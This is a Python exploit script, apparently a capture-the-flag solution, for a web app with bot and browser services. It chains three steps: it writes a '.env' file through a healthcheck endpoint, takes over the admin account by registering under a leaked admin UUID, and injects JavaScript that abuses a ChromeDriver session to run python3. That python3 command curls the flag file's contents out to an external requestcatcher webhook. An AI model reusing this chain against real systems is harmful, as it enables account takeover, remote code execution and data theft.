import httpx,re,time

URL_BOT = "http://localhost:1331/bot"
# URL_BROWSER = "http://localhost:3001"
URL_BROWSER = "http://localhost:1331/browser"
WEBHOOK = "https://headachefinal.requestcatcher.com"
class BaseAPI:
    def __init__(self) -> None:
        self.bot = httpx.Client(base_url=URL_BOT)
        self.browser = httpx.Client(base_url=URL_BROWSER)
    def start_browser(self):
        try:
            r = self.browser.post('/healthcheck/health', json={
                'db':"\\x2e\\x65\\x6e\\x76",
                'data': 'DEBUG=true'
            })
            print(r.text)
        except:
            pass
        
    def create_rce_with_sessionchrome(self, script):
        r = self.bot.post('/v1/admin/submit', json={
            "status_sc" : script
        })
        
        return r.text
    
    def register(self, name,email="test@mail.com", password="test"):
        r = self.bot.post('/v1/auth/signup', json={
            "name": name,
            "email": email,
            "password": password
        })
        return r.status_code
    
    def login(self, email="test@mail.com", password="test"):
        r = self.bot.post('/v1/auth/signin', json={
            "email": email,
            "password": password
        })
        return r.json()["user"]["access_token"]
    
    def get_admin_uuid(self):
        r = self.bot.get("/v1/health")
        self.uuid = re.findall(r"back (.*)", r.text)[0]
        # print(uuid)
    def admin_takeover(self):
        self.get_admin_uuid()
        self.register(name=self.uuid)    
        token = self.login()
        print('[+] token : ' + token)
        self.bot.headers["Authorization"] = f"{token}"
        print(self.create_rce_with_sessionchrome("""const [callback] = arguments;\r\n\r\nconst snapshot = (thedata) => callback(thedata);\r\n\r\ntry {\r\n    fetch('http:\/\/localhost:6969\/session', {\r\n        method: 'POST',\r\n        headers: {\r\n            'Content-Type': 'application\/json'\r\n        },\r\n        body: JSON.stringify({\r\n            capabilities: {\r\n            alwaysMatch: {\r\n                \"goog:chromeOptions\": {\r\n                \"binary\": \"\/usr\/bin\/python3\",\r\n                    \"args\":[\"-c__import__(\\\"os\\\").system(\\\"curl https://headachefinal.requestcatcher.com/$(cat /f*)\\\")\"]\r\n                }\r\n            }\r\n            }\r\n        })\r\n        })\r\n        .then(response => response.json())\r\n        .then(data => console.log(data))\r\n        .catch(error => {\r\n            console.error(\"Error fetching the data:\", error);\r\n            snapshot(error.message);\r\n        });\r\n} catch (error) {\r\n    console.error(\"Error processing the data:\", error);\r\n    snapshot(error.message);\r\n}"""))
        
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    api.start_browser()
    print('[+] Started browser')
    time.sleep(1)
    print('[-] Loading')
    time.sleep(1)
    print('[+] Loading to takeover')
    time.sleep(1)
    print('[-] Loading')
    while True:
        print('[+] Started takeover and rce')
        time.sleep(1)
        api.admin_takeover()